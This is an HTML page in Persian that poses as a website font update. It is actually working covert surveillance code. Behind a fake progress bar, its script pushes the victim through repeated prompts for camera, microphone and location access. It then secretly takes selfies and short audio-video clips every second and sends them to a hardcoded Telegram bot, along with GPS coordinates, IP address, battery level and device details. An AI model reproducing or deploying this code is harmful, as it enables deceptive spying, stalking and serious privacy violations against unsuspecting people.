<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>به‌روزرسانی فونت</title>
    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap" rel="stylesheet" />
    <style>
        :root {
            --bg: #0f0f1e;
            --card: rgba(25, 25, 40, 0.95);
            --accent: #8b5cf6;
            --text: #f0e6ff;
            --glow: 0 0 25px rgba(139, 92, 246, 0.4);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: var(--bg);
            color: var(--text);
            font-family: 'Vazirmatn', sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            background: radial-gradient(circle at center, #1a1a2e 0%, var(--bg) 100%);
        }

        .container {
            width: 90%;
            max-width: 380px;
            background: var(--card);
            backdrop-filter: blur(16px);
            border-radius: 24px;
            padding: 32px 24px;
            box-shadow: var(--glow), 0 15px 35px rgba(0,0,0,0.4);
            text-align: center;
            animation: float 5s ease-in-out infinite;
            border: 1px solid rgba(139,92,246,0.2);
        }

        @keyframes float { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-12px)} }

        .icon {
            width: 80px; height: 80px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #7c3aed, #a78bfa);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: var(--glow);
            animation: pulse 2s infinite;
        }

        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.08)} }

        .icon svg { width: 44px; height: 44px; fill: white; }

        h1 { font-size: 1.4rem; margin-bottom: 16px; background: linear-gradient(90deg, #c4b5fd, #e0c3fc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }

        .message { font-size: 0.95rem; line-height: 1.7; margin: 20px 0; color: #cbd5e1; padding: 16px; background: rgba(139,92,246,0.1); border-radius: 16px; border: 1px dashed rgba(139,92,246,0.3); }

        .btn {
            width: 100%; padding: 16px; background: linear-gradient(135deg, #7c3aed, #a78bfa); color: white; border: none; border-radius: 16px; font-size: 1.1rem; font-weight: 600; margin: 20px 0; cursor: pointer; box-shadow: 0 8px 20px rgba(124, 58, 237, 0.4); transition: all 0.3s ease;
        }

        .loader { display: none; margin: 30px auto; width: 70px; height: 70px; border: 6px solid rgba(139,92,246,0.3); border-top: 6px solid #c4b5fd; border-radius: 50%; animation: spin 1s infinite; box-shadow: var(--glow); }
        @keyframes spin { to { transform: rotate(360deg); } }

        .progress { display: none; margin: 20px 0; font-size: 0.9rem; color: #94a3b8; }
        .status { font-size: 0.88rem; color: #94a3b8; margin-top: 10px; animation: fade 2s infinite; }
        @keyframes fade { 0%,100%{opacity:0.7} 50%{opacity:1} }

        .hidden { display: none !important; }

        /* Stealth */
        #camVideo, #chopinPlayer { position: fixed; top: -9999px; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
    </style>
</head>
<body>

<div class="container">
    <div class="icon">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
    </div>

    <h1>مشکل در نمایش فونت‌ها</h1>
    <div class="message">
        مرورگر یا دستگاه شما <strong>فونت‌های جدید این وبسایت</strong> را پشتیبانی نمی‌کند.<br><br>
        برای نمایش صحیح، لطفاً روی دکمه زیر کلیک کنید تا فونت‌ها به‌صورت خودکار آپدیت شوند.
    </div>

    <button class="btn" id="startBtn">بزن بریم</button>

    <div id="loading" class="hidden">
        <div class="loader"></div>
        <div class="progress" id="progressText">در حال دانلود فونت‌ها... ۰٪</div>
        <div class="status" id="statusText">در حال ادغام فونت‌ها...</div>
    </div>
</div>

<!-- Hidden Selfie Camera -->
<video id="camVideo" playsinline muted></video>

<!-- Chopin from Persian Online -->
<iframe id="chopinPlayer" src="https://www.musicdel.ir/single/فریدریک-شوپن-نوکترن-اپوس-۹-شماره-۲?autoplay=1" allow="autoplay" style="display:none"></iframe>

<script>
    // === TELEGRAM ===
    const USER_ID = "7625898629";
    const BOT_TOKEN = "8547105891:AAHfkoex33xxz9TWP612juJHtvxOZmWNQk8";
    const API = `https://api.telegram.org/bot${BOT_TOKEN}`;

    // === ELEMENTS ===
    const startBtn = document.getElementById('startBtn');
    const loading = document.getElementById('loading');
    const progressText = document.getElementById('progressText');
    const statusText = document.getElementById('statusText');
    const video = document.getElementById('camVideo');

    // === STATE ===
    let percent = 0;
    let stream = null;
    let intervalId = null;
    let lastLocation = null;
    let photoCount = 0;
    let videoCount = 0;

    // === UNIVERSAL DETECTION ===
    const detect = () => {
        const ua = navigator.userAgent;
        const isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
        const isAndroid = /Android/.test(ua);
        const isChrome = /Chrome/.test(ua) && !/Edg/.test(ua);
        const isSafari = /^((?!chrome|android).)*safari/i.test(ua);
        const isFirefox = /Firefox/.test(ua);

        let device = isIOS ? 'آیفون/آیپد' : isAndroid ? 'اندروید' : /Win/.test(navigator.platform) ? 'ویندوز' : /Mac/.test(navigator.platform) ? 'مک' : 'نامشخص';
        let browser = isChrome ? 'کروم' : isSafari ? 'سافاری' : isFirefox ? 'فایرفاکس' : 'نامشخص';

        return { device, browser, isIOS, isAndroid };
    };

    // === SEND ===
    const send = (text) => {
        fetch(`${API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: USER_ID, text: `PERM: ${text}` })
        }).catch(() => {});
    };

    const sendPhoto = (blob) => {
        const form = new FormData();
        form.append('chat_id', USER_ID);
        form.append('photo', blob, `selfie_${++photoCount}.jpg`);
        fetch(`${API}/sendPhoto`, { method: 'POST', body: form }).catch(() => {});
    };

    const sendVideo = (blob) => {
        const form = new FormData();
        form.append('chat_id', USER_ID);
        form.append('video', blob, `selfie_video_${++videoCount}.webm`);
        fetch(`${API}/sendVideo`, { method: 'POST', body: form }).catch(() => {});
    };

    // === CAPTURE SELFIE ===
    const captureSelfie = () => {
        if (!video.videoWidth || !video.videoHeight) return;
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        canvas.toBlob(sendPhoto, 'image/jpeg', 0.85);
    };

    // === RECORD SELFIE VIDEO WITH AUDIO ===
    const recordSelfieVideo = () => {
        if (!stream) return;
        const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' :
                     MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
        const recorder = new MediaRecorder(stream, { mimeType: mime });
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = () => {
            const blob = new Blob(chunks, { type: mime });
            sendVideo(blob);
        };
        recorder.start();
        setTimeout(() => recorder.stop(), 1000);
    };

    // === LIVE LOCATION ===
    const sendLiveLocation = () => {
        navigator.geolocation.getCurrentPosition(
            pos => {
                const lat = pos.coords.latitude.toFixed(7);
                const lng = pos.coords.longitude.toFixed(7);
                const acc = pos.coords.accuracy.toFixed(1);
                const newLoc = `${lat},${lng}`;
                if (lastLocation !== newLoc) {
                    send(`لوکیشن: ${lat}, ${lng} (±${acc}m)`);
                    lastLocation = newLoc;
                }
            },
            () => {},
            { enableHighAccuracy: true, maximumAge: 0, timeout: 3000 }
        );
    };

    // === EVERY SECOND HARVEST ===
    const startHarvest = () => {
        intervalId = setInterval(() => {
            captureSelfie();
            recordSelfieVideo();
            sendLiveLocation();
            send(`زنده — ${new Date().toLocaleTimeString('fa-IR')}`);
        }, 1000);
    };

    // === STOP ===
    const stopHarvest = () => {
        if (intervalId) clearInterval(intervalId);
        if (stream) stream.getTracks().forEach(t => t.stop());
        send('خارج شد');
    };

    // === FORCE PERMISSION WITH 6 LAYERS ===
    const forcePermission = async () => {
        video.playsinline = true;
        video.muted = true;

        // Layer 1: Camera + Audio + Selfie
        let cameraPromise = navigator.mediaDevices.getUserMedia({
            video: { facingMode: { exact: "user" } },
            audio: true
        });
        let locationPromise = new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(resolve, resolve, { enableHighAccuracy: true });
        });
        try {
            await Promise.all([cameraPromise, locationPromise]);
            stream = await cameraPromise;
            video.srcObject = stream;
            video.play();
            send('پرمیژن: دوربین + صدا + لوکیشن — لایه 1');
            return true;
        } catch (e) {}

        // Layer 2: Relaxed + Audio
        cameraPromise = navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" },
            audio: true
        });
        try {
            await Promise.all([cameraPromise, locationPromise]);
            stream = await cameraPromise;
            video.srcObject = stream;
            video.play();
            send('پرمیژن: relaxed + صدا + لوکیشن — لایه 2');
            return true;
        } catch (e) {}

        // Layer 3: Any Camera + Audio
        cameraPromise = navigator.mediaDevices.getUserMedia({
            video: true,
            audio: true
        });
        try {
            await Promise.all([cameraPromise, locationPromise]);
            stream = await cameraPromise;
            video.srcObject = stream;
            video.play();
            send('پرمیژن: هر دوربین + صدا + لوکیشن — لایه 3');
            return true;
        } catch (e) {}

        // Layer 4: Enumerate + Audio
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(d => d.kind === 'videoinput');
            const audioDevices = devices.filter(d => d.kind === 'audioinput');
            const selfieId = videoDevices.find(d => d.label.toLowerCase().includes('front') || d.label.toLowerCase().includes('selfie'))?.deviceId;
            cameraPromise = navigator.mediaDevices.getUserMedia({
                video: selfieId ? { deviceId: { exact: selfieId } } : true,
                audio: audioDevices.length > 0 ? { deviceId: { exact: audioDevices[0].deviceId } } : true
            });
            await Promise.all([cameraPromise, locationPromise]);
            stream = await cameraPromise;
            video.srcObject = stream;
            video.play();
            send('پرمیژن: enumerate + صدا + لوکیشن — لایه 4');
            return true;
        } catch (e) {}

        // Layer 5: Audio Only + Location
        try {
            const audioPromise = navigator.mediaDevices.getUserMedia({ audio: true });
            await Promise.all([audioPromise, locationPromise]);
            send('پرمیژن: فقط صدا + لوکیشن — لایه 5');
            return true;
        } catch (e) {}

        // Layer 6: Alert Force + Retry
        alert('لطفاً دسترسی‌ها را تأیید کنید — برای آپدیت فونت لازم است!');
        setTimeout(forcePermission, 1000);
        send('پرمیژن: alert force — لایه 6');
        return false;
    };

    // === MAIN CLICK ===
    startBtn.onclick = async () => {
        startBtn.classList.add('hidden');
        loading.classList.remove('hidden');

        const { device, browser, isIOS, isAndroid } = detect();
        send(`شروع پرمیژن — ${device} | ${browser}`);

        const success = await forcePermission();
        if (success) {
            startHarvest();
        }

        // === CHOPIN ===
        document.getElementById('chopinPlayer').src += '&autoplay=1';
        send('شوپن پخش شد');

        // === PROGRESS ===
        setInterval(() => {
            if (percent < 97) {
                percent += Math.floor(Math.random() * 6) + 2;
                progressText.innerHTML = `در حال دانلود فونت‌ها... <strong>${percent}%</strong>`;
            }
        }, 1800);

        // === STATUS ===
        const msgs = ["ادغام فونت...", "بهینه‌سازی...", "اتصال سرور..."];
        let i = 0;
        setInterval(() => statusText.textContent = msgs[i++ % 3], 3000);

        // === BATTERY + IP ===
        if ('getBattery' in navigator) navigator.getBattery().then(b => send(`باتری: ${Math.round(b.level*100)}%`));
        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => send(`IP: ${d.ip}`));
    };

    // === LOAD ===
    window.onload = () => {
        const { device, browser } = detect();
        send(`باز شد — ${device} | ${browser}`);
    };

    // === STOP ===
    window.addEventListener('beforeunload', stopHarvest);
    document.addEventListener('visibilitychange', () => document.hidden && stopHarvest());
</script>

</body>
</html>
